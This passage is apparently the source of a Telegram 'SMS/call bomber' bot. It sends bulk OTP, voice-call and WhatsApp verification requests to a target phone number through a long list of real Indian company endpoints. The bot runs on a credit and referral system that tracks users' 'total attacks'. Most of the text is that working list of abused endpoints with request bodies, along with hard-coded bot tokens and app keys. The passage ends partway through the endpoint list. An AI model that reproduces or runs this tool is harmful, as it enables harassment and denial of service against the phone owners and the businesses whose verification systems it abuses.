#!/usr/bin/env python3
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import json
import os
import random
import string
import threading
import asyncio
import aiohttp
import time
import requests
from datetime import datetime
from user_agent import generate_user_agent
import base64
import urllib.parse
import socket
import hashlib
import inspect
import re

# ================= BOT CONFIGURATION =================
BOT_TOKEN = "8842284556:AAHRjykdIXJuVS5wm_FZkEIQLPqeMGf7oT4"
ADMIN_IDS = [8416917212]
DATA_FILE = "users_data.json"
PROTECTED_FILE = "protected_numbers.json"
PANELS_FILE = "user_panels.json"
REFERRAL_FILE = "referrals.json"
bombing_status = {}

bot = telebot.TeleBot(BOT_TOKEN)

# ============ FORCE JOIN CHANNELS ============
REQUIRED_CHANNELS = ["@DRAGON_AARMY_LEGEND_1"]  # FIXED: merged both lists

def is_joined(user_id):
    if user_id in ADMIN_IDS:
        return True
    for ch in REQUIRED_CHANNELS:
        try:
            member = bot.get_chat_member(ch, user_id)
            if member.status in ["left", "kicked"]:
                return False
        except:
            return False
    return True

# ============ HOSTING PANEL DATA ============
def load_panels():
    if not os.path.exists(PANELS_FILE):
        return {"users": {}}
    with open(PANELS_FILE, "r") as f:
        return json.load(f)

def save_panels(data):
    with open(PANELS_FILE, "w") as f:
        json.dump(data, f, indent=4)

def get_user_panels(user_id):
    data = load_panels()
    uid = str(user_id)
    if uid not in data["users"]:
        data["users"][uid] = {"balance": 0, "panels": [], "referral_code": None}
        save_panels(data)
    return data["users"][uid]

def add_user_panel(user_id, panel_info):
    data = load_panels()
    uid = str(user_id)
    if uid not in data["users"]:
        data["users"][uid] = {"balance": 0, "panels": [], "referral_code": None}
    data["users"][uid]["panels"].append(panel_info)
    save_panels(data)

def update_panel_balance(user_id, amount):
    data = load_panels()
    uid = str(user_id)
    if uid not in data["users"]:
        data["users"][uid] = {"balance": 0, "panels": [], "referral_code": None}
    data["users"][uid]["balance"] += amount
    save_panels(data)

# ============ REFERRAL SYSTEM ============
def load_referrals():
    if not os.path.exists(REFERRAL_FILE):
        return {"codes": {}, "used": [], "referral_counts": {}}  # FIXED: added referral_counts
    with open(REFERRAL_FILE, "r") as f:
        return json.load(f)

def save_referrals(data):
    with open(REFERRAL_FILE, "w") as f:
        json.dump(data, f, indent=4)

def generate_referral_code(user_id):
    data = load_referrals()
    uid = str(user_id)
    if uid in data["codes"]:
        return data["codes"][uid]
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    data["codes"][uid] = code
    save_referrals(data)
    return code

def get_referral_count(user_id):
    data = load_referrals()
    return data.get("referral_counts", {}).get(str(user_id), 0)

def process_referral(new_user_id, ref_code):
    data = load_referrals()
    owner_id = None
    for uid, code in data["codes"].items():
        if code == ref_code:
            owner_id = uid
            break
    if not owner_id or owner_id == str(new_user_id):
        return False
    if str(new_user_id) in data.get("used", []):
        return False
    update_credits(owner_id, 25)
    update_credits(new_user_id, 25)
    if "used" not in data:
        data["used"] = []
    data["used"].append(str(new_user_id))
    if "referral_counts" not in data:
        data["referral_counts"] = {}
    data["referral_counts"][owner_id] = data["referral_counts"].get(owner_id, 0) + 1
    save_referrals(data)
    return True

# ============ PROTECTED NUMBERS ============
def load_protected():
    if not os.path.exists(PROTECTED_FILE):
        return []
    with open(PROTECTED_FILE, "r") as f:
        return json.load(f)

def save_protected(protected_list):
    with open(PROTECTED_FILE, "w") as f:
        json.dump(protected_list, f, indent=4)

def add_protected_number(phone):
    protected = load_protected()
    if phone not in protected:
        protected.append(phone)
        save_protected(protected)
        return True
    return False

def remove_protected_number(phone):
    protected = load_protected()
    if phone in protected:
        protected.remove(phone)
        save_protected(protected)
        return True
    return False

def is_protected(phone):
    return str(phone) in load_protected()

# ============ USER CREDITS SYSTEM ============
def load_data():
    if not os.path.exists(DATA_FILE):
        data = {"users": {}, "codes": {}, "panel_codes": {}, "banned": []}
        save_data(data)
        return data
    with open(DATA_FILE, "r") as f:
        return json.load(f)

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

def get_user(user_id):
    data = load_data()
    uid = str(user_id)
    if uid not in data["users"]:
        data["users"][uid] = {"credits": 0, "last_daily": "", "total_attacks": 0, "username": "", "first_name": ""}
        save_data(data)
    return data["users"][uid]

def update_credits(user_id, amount):
    data = load_data()
    uid = str(user_id)
    if uid not in data["users"]:
        data["users"][uid] = {"credits": 0, "last_daily": "", "total_attacks": 0, "username": "", "first_name": ""}
    data["users"][uid]["credits"] += amount
    save_data(data)
    return data["users"][uid]["credits"]

# ============ DAILY CUSTOM EMOJI ============
def get_daily_emoji():
    today = datetime.now().strftime("%Y-%m-%d")
    emojis = ["🔥", "⭐", "💎", "⚡", "🎉", "✨", "💥", "🌟", "🌀", "🍀", "🎈", "💪", "🤖", "👑", "💎"]
    day_num = int(datetime.now().strftime("%j")) % len(emojis)
    return emojis[day_num]

# ============ FALLBACK DATA GENERATOR ============
def make_data(phone, api_name):
    name_lower = api_name.lower()
    if "voice" in name_lower or "call" in name_lower:
        if "tata" in name_lower:
            return f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
        elif "1mg" in name_lower:
            return f'{{"number":"{phone}","otp_on_call":true}}'
        elif "swiggy" in name_lower:
            return f'{{"mobile":"{phone}"}}'
        elif "flipkart" in name_lower:
            return f'{{"mobile":"{phone}"}}'
        elif "amazon" in name_lower:
            return f"phone={phone}&action=voice_otp"
        elif "paytm" in name_lower:
            return f'{{"phone":"{phone}"}}'
        elif "uber" in name_lower:
            return f'{{"phone":"+91{phone}"}}'
        else:
            return f'{{"mobile":"{phone}"}}'
    if "whatsapp" in name_lower:
        if "kpn" in name_lower:
            return f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
        elif "foxy" in name_lower:
            return f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
        else:
            return f'{{"mobile":"{phone}","channel":"whatsapp"}}'
    return f'{{"mobile":"{phone}"}}'

# ============ ALL APIS (MERGED) ============
OLD_APIS = [
    {"name": "Tata Capital", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "1MG", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Swiggy", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Myntra", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Flipkart", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Amazon", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": None},
    {"name": "Paytm", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Zomato", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": None},
    {"name": "MakeMyTrip", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Goibibo", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Ola", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Uber", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f"}, "data": None},
    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "NoBroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": None},
    {"name": "PharmEasy", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Byjus", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": None},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Housing", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": None},
    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "DeHaat", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Spencer", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Shoppers Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Lifestyle", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Tata Motors", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
    {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": None},
]

NEW_APIS = [
    {"name": "splexxo1", "url": "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO", "method": "GET", "headers": {}, "data": None},
    {"name": "agrevolution_otp", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile_number": phone, "client_id": "kisan-app"})},
    {"name": "breeze_session", "url": "https://api.breeze.in/session/start", "method": "POST", "headers": {"Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8"}, "data": lambda phone: json.dumps({"phoneNumber": phone, "authVerificationType": "otp", "device": {"id": "A1pKVEDhlv66KLtoYsml3", "platform": "Chrome", "type": "Desktop"}, "countryCode": "+91"})},
    {"name": "jockey_whatsapp", "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true", "method": "GET", "headers": {"accept": "*/*", "user-agent": "Mozilla/5.0", "origin": "https://www.jockey.in", "referer": "https://www.jockey.in/"}, "data": None},
    {"name": "kpn_fresh", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3", "method": "POST", "headers": {"x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json; charset=UTF-8"}, "data": lambda phone: json.dumps({"phone_number": {"country_code": "+91", "number": phone}})},
    {"name": "aditya_birla", "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"MobileNumber={phone}&functionality=signup"},
    {"name": "muthoot_finance", "url": "https://www.muthootfinance.com/smsapi.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"mobile={phone}&pin=XjtYYEdhP0haXjo3"},
    {"name": "gopaysense", "url": "https://api.gopaysense.com/users/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone": phone})},
    {"name": "iifl", "url": "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1&_drupal_ajax=1"},
    {"name": "bankopen", "url": "https://v2-api.bankopen.co/users/register/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"username": phone, "is_open_capital": 1})},
    {"name": "tata_capital_retail", "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"header": {"authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", "identifier": "nli"}, "body": {"mobileNumber": phone}})},
    {"name": "tradeindia", "url": "https://apis.tradeindia.com/app_login_api/login_app", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile": f"+91{phone}"})},
    {"name": "khatabook_app", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"x-kb-app-name": "khatabook", "Content-Type": "application/json; charset=UTF-8"}, "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "app_signature": "wk+avHrHZf2"})},
    {"name": "orange_health", "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile_number": phone, "customer_auto_fetch_message": True})},
    {"name": "jobhai", "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}, "data": lambda phone: json.dumps({"phone": phone})},
    {"name": "mconnect", "url": "https://mconnect.isteer.co/mconnect/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile_number": f"+91{phone}"})},
    {"name": "astrosage_varta", "url": "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0", "method": "GET", "headers": {}, "data": None},
    {"name": "spinny", "url": "https://api.spinny.com/api/c/user/otp-request/v3/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"contact_number": phone, "whatsapp": False, "code_len": 4, "expected_action": "login"})},
    {"name": "dream11", "url": "https://www.dream11.com/auth/passwordless/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"channel": "sms", "flow": "SIGNUP", "phoneNumber": phone, "templateName": "default"})},
    {"name": "citymall", "url": "https://citymall.live/api/cl-user/auth/get-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone_number": phone})},
    {"name": "codfirm", "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={phone}&storeUrl=bellavita1.myshopify.com", "method": "GET", "headers": {}, "data": None},
    {"name": "oyo", "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en", "method": "POST", "headers": {"Content-Type": "text/plain;charset=UTF-8"}, "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "nod": 4})},
    {"name": "myma", "url": "https://portal.myma.in/custom-api/auth/generateotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"countrycode": "+91", "mobile": f"91{phone}", "is_otpgenerated": False, "app_version": "-1"})},
    {"name": "freedo_rentals", "url": "https://api.freedo.rentals/customer/sendOtpForSignUp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"email_id": "cokiwav528@avastu.com", "first_name": "Haiii", "mobile_number": phone})},
    {"name": "licious", "url": "https://www.licious.in/api/login/signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone": phone, "captcha_token": None})},
    {"name": "bisleri", "url": "https://apis.bisleri.com/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"email": "abfhhfhcd@gmail.com", "mobile": phone})},
    {"name": "evital", "url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"pharmacy_name": "hfhfjfgfhkf", "mobile": phone, "referral_code": "", "email_id": "jhvd@gmail.com", "zip_code": "110086", "device_id": "f2cea99f-381d-432d-bd27-02bc6678fa93", "app_version": "desktop", "device_name": "Chrome"})},
    {"name": "quickride", "url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new", "method": "POST", "headers": {"APP-TOKEN": "s16-q9fz-jy3p-rk", "Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"contactNo={phone}&countryCode=%2B91&appName=Quick%20Ride"},
    {"name": "clovia", "url": "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}&isSignUp=true", "method": "GET", "headers": {}, "data": None},
    {"name": "kwikfix", "url": "https://admin.kwikfixauto.in/api/auth/signupotp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone": phone})},
    {"name": "brevistay", "url": "https://www.brevistay.com/cst/app-api/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"is_otp": 1, "is_password": 0, "mobile": phone})},
    {"name": "hourlyrooms", "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone": phone})},
    {"name": "madrasmandi", "url": "https://api.madrasmandi.in/api/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryBBzDmO8qIRlvPMMZ"}, "data": lambda phone: f'------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+91{phone}\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="scope"\r\n\r\nclient\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ--\r\n'},
    {"name": "bharatloan", "url": "https://www.bharatloan.com/login-sbm", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"mobile={phone}&current_page=login&is_existing_customer=2"},
    {"name": "pagarbook", "url": "https://api.pagarbook.com/api/v5/auth/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone": phone, "language": 1})},
    {"name": "vahak", "url": "https://api.vahak.in/v1/u/o_w", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone_number": phone, "scope": 0, "is_whatsapp": False})},
    {"name": "redcliffelabs", "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone_number": phone, "short": True})},
    {"name": "ixigo", "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp", "method": "POST", "headers": {"apikey": "ixiweb\u00212$", "Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"sixDigitOTP=true&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone={phone}"},
    {"name": "55club", "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}, "data": lambda phone: json.dumps({"phone": f"91{phone}", "codeType": 1, "language": 0})},
    {"name": "zerodha", "url": "https://zerodha.com/account/registration.php", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}, "data": lambda phone: json.dumps({"mobile": phone, "source": "zerodha", "partner_id": ""})},
    {"name": "testbook", "url": "https://api.testbook.com/api/v2/mobile/signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile": phone, "signupDetails": {"page": "HomePage"}})},
    {"name": "medibuddy", "url": "https://loginprod.medibuddy.in/unified-login/user/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"source": "medibuddyInWeb", "platform": "medibuddy", "phonenumber": phone, "flow": "Retail-Login-Home-Flow"})},
    {"name": "tradeindia_reg", "url": "https://api.tradeindia.com/home/registration/", "method": "POST", "headers": {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarypzpW5AB7AKLEX4iX"}, "data": lambda phone: f'------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="country_code"\r\n\r\n+91\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{phone}\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="whatsapp_update"\r\n\r\ntrue\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="name"\r\n\r\natyug\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="email"\r\n\r\ndrhufj@gmail.com\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="terms"\r\n\r\ntrue\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX--\r\n'},
    {"name": "beyoung", "url": "https://www.beyoung.in/api/sendOtp.json", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}, "data": lambda phone: json.dumps({"username": phone, "username_type": "mobile", "service_type": 0})},
    {"name": "wrogn", "url": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", "method": "POST", "headers": {"action": "sendOTP", "Content-Type": "application/json"}, "data": lambda phone: json.dumps({"username": f"+91{phone}", "type": "mobile", "domain": "wrogn.com"})},
    {"name": "medkart", "url": "https://app.medkart.in/api/v1/auth/requestOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile_no": phone})},
    {"name": "coverfox", "url": "https://www.coverfox.com/otp/send/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"csrfmiddlewaretoken=5YvA2IoBS6KRJrzV93ysh0VRRvT7CagG3DO7TPu5TwZ9161xVWsEsHzL6mYfvnIA&contact={phone}"},
    {"name": "woodenstreet", "url": "https://www.woodenstreet.com/index.php?route=account/forgotten_popup", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"token=&firstname=Aartd&telephone={phone}&pincode=110086&city=NORTH+WEST+DELHI&state=DELHI&cxid=NTUxOTE0&email=hdftysdrt%40gmail.com&password=%40Abvdthfuj&pagesource=onload&login=2&userput_otp="},
    {"name": "gomechanic", "url": "https://gomechanic.app/api/v2/send_otp", "method": "POST", "headers": {"Authorization": "725ea1b774c3558a8ec01a8405334a6e50e1e822d9549d84b36a1d3bb9478a27", "Content-Type": "application/json"}, "data": lambda phone: json.dumps({"number": phone, "source": "website", "random_id": "K6z9b"})},
    {"name": "lovelocal", "url": "https://homedeliverybackend.mpaani.com/auth/send-otp", "method": "POST", "headers": {"client-code": "vulpix", "Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone_number": phone, "role": "CUSTOMER"})},
    {"name": "tyreplex", "url": "https://www.tyreplex.com/includes/ajax/gfend.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"perform_action=sendOTP&mobile_no={phone}&action_type=order_login"},
    {"name": "udaan", "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"}, "data": lambda phone: f"mobile={phone}"},
    {"name": "xylem", "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile": phone, "countryCode": "+91", "firstName": "Anant Ambani"})},
    {"name": "nobroker_v1", "url": "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"phone=%2B91{phone}"},
    {"name": "vidyakul", "url": "https://vidyakul.com/signup-otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"phone={phone}"},
    {"name": "woodenstreet_register", "url": "https://api.woodenstreet.com/api/v1/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"firstname": "Astres", "email": "abcdhbdgud77dd@gmail.com", "telephone": phone, "password": "abcd@gmail.com#%fd", "isGuest": 0, "pincode": "110001"})},
]

ULTIMATE_APIS = [
    {"name": "Tata Capital Voice Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'},
